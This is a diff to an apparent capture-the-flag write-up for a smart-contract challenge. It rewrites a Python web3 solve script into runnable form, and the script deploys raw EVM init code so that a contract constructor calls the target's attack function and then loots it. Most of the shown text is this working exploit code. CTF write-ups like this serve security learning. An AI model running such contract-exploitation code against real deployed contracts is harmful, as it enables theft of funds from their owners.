@@ -45,90 +45,97 @@ To successfully deduct health points (deal damage), the following must be met:
 
 so，use the py below
 
-> **_from web3 import Web3_**
+from web3 import Web3
 
-> **_RPC_URL = “http://your target/rpc"  
-> PRIVATE_KEY = “what you get from connection”  
-> TARGET = Web3.to_checksum_address(“what you get from connection”)_**
+RPC_URL = "http://TARGET/rpc"
+PRIVATE_KEY = "KEY YOU GET FORM CONNECTION"
+TARGET = Web3.to_checksum_address("KEY YOU GET FORM CONNECTION")
 
-> **_w3 = Web3(Web3.HTTPProvider(RPC_URL))  
-> acct = w3.eth.account.from_key(PRIVATE_KEY)_**
+w3 = Web3(Web3.HTTPProvider(RPC_URL))
+acct = w3.eth.account.from_key(PRIVATE_KEY)
 
-> **_abi = [  
->  {“inputs”:[{“name”:”_damage”,”type”:”uint256"}],”name”:”attack”,”outputs”:[],”stateMutability”:”nonpayable”,”type”:”function”},  
->  {“inputs”:[],”name”:”loot”,”outputs”:[],”stateMutability”:”nonpayable”,”type”:”function”},  
->  {“inputs”:[],”name”:”lifePoints”,”outputs”:[{“type”:”uint256",”name”:””}],”stateMutability”:”view”,”type”:”function”},  
-> ]_**
+abi = [
+    {"inputs":[{"name":"_damage","type":"uint256"}],"name":"attack","outputs":[],"stateMutability":"nonpayable","type":"function"},
+    {"inputs":[],"name":"loot","outputs":[],"stateMutability":"nonpayable","type":"function"},
+    {"inputs":[],"name":"lifePoints","outputs":[{"type":"uint256","name":""}],"stateMutability":"view","type":"function"},
+]
 
-> **_target = w3.eth.contract(address=TARGET, abi=abi)_**
+target = w3.eth.contract(address=TARGET, abi=abi)
 
-> **_def send_tx(tx):  
->  signed = acct.sign_transaction(tx)  
->  tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)  
->  receipt = w3.eth.wait_for_transaction_receipt(tx_hash)  
->  print(“[+] tx:”, tx_hash.hex(), “status:”, receipt.status)  
->  if receipt.status != 1:  
->  raise Exception(“transaction reverted”)  
->  return receipt_**
+def send_tx(tx):
+    signed = acct.sign_transaction(tx)
+    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
+    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
+    print("[+] tx:", tx_hash.hex(), "status:", receipt.status)
+    if receipt.status != 1:
+        raise Exception("transaction reverted")
+    return receipt
 
-> **_nonce = w3.eth.get_transaction_count(acct.address)  
-> gas_price = w3.eth.gas_price  
-> chain_id = w3.eth.chain_id_**
+nonce = w3.eth.get_transaction_count(acct.address)
+gas_price = w3.eth.gas_price
+chain_id = w3.eth.chain_id
 
-> **_print(“[*] account:”, acct.address)  
-> print(“[*] chain_id:”, chain_id)_** 
-> print(“[*] Setting aggro…”)  
-> tx = target.functions.attack(0).build_transaction({  
->  “from”: acct.address,  
->  “nonce”: nonce,  
->  “gas”: 200000,  
->  “gasPrice”: gas_price,  
->  “chainId”: chain_id,  
-> })  
-> send_tx(tx)  
-> nonce += 1_**
+print("[*] account:", acct.address)
+print("[*] chain_id:", chain_id)
 
-> **_hp = target.functions.lifePoints().call()  
-> print(“[*] HP before:”, hp)_**
-> selector = w3.keccak(text=”attack(uint256)”)[:4]  
-> calldata = selector + hp.to_bytes(32, “big”)_**
+# 1. EOA 先调用一次，设置 aggro = 你的钱包地址
+print("[*] Setting aggro...")
+tx = target.functions.attack(0).build_transaction({
+    "from": acct.address,
+    "nonce": nonce,
+    "gas": 200000,
+    "gasPrice": gas_price,
+    "chainId": chain_id,
+})
+send_tx(tx)
+nonce += 1
 
-> **_target_hex = TARGET[2:]_**
+hp = target.functions.lifePoints().call()
+print("[*] HP before:", hp)
 
-> **_# init code:  
-> # codecopy calldata -> mem[0]  
-> # CALL target.attack(hp)  
-> # return empty runtime  
-> init_code = (  
->  “6024602e600039”  
->  “6000600060246000600073” + target_hex +  
->  “5af15060006000f3”  
-> ) + calldata.hex()_**
+# 2. 部署一段 init code：创建合约时由“合约地址”调用 target.attack(hp)
+selector = w3.keccak(text="attack(uint256)")[:4]
+calldata = selector + hp.to_bytes(32, "big")
 
-> **_print(“[*] Attacking via constructor contract…”)  
-> tx = {  
->  “from”: acct.address,  
->  “nonce”: nonce,  
->  “gas”: 300000,  
->  “gasPrice”: gas_price,  
->  “chainId”: chain_id,  
->  “data”: “0x” + init_code,  
-> }  
-> send_tx(tx)  
-> nonce += 1_**
-> **_hp = target.functions.lifePoints().call()  
-> print(“[*] HP after:”, hp)_**
-> print(“[*] Looting…”)  
-> tx = target.functions.loot().build_transaction({  
->  “from”: acct.address,  
->  “nonce”: nonce,  
->  “gas”: 200000,  
->  “gasPrice”: gas_price,  
->  “chainId”: chain_id,  
-> })  
-> send_tx(tx)_**
+target_hex = TARGET[2:]
 
-> **_print(“[+] DONE”)_**
+# init code:
+# codecopy calldata -> mem[0]
+# CALL target.attack(hp)
+# return empty runtime
+init_code = (
+    "6024602e600039"
+    "6000600060246000600073" + target_hex +
+    "5af15060006000f3"
+) + calldata.hex()
+
+print("[*] Attacking via constructor contract...")
+tx = {
+    "from": acct.address,
+    "nonce": nonce,
+    "gas": 300000,
+    "gasPrice": gas_price,
+    "chainId": chain_id,
+    "data": "0x" + init_code,
+}
+send_tx(tx)
+nonce += 1
+
+hp = target.functions.lifePoints().call()
+print("[*] HP after:", hp)
+
+# 3. loot
+print("[*] Looting...")
+tx = target.functions.loot().build_transaction({
+    "from": acct.address,
+    "nonce": nonce,
+    "gas": 200000,
+    "gasPrice": gas_price,
+    "chainId": chain_id,
+})
+send_tx(tx)
+
+print("[+] DONE")
 
 ![](https://cdn-images-1.medium.com/max/1000/1*NfYEBYJquJPTVka_w4fniQ.png)
 
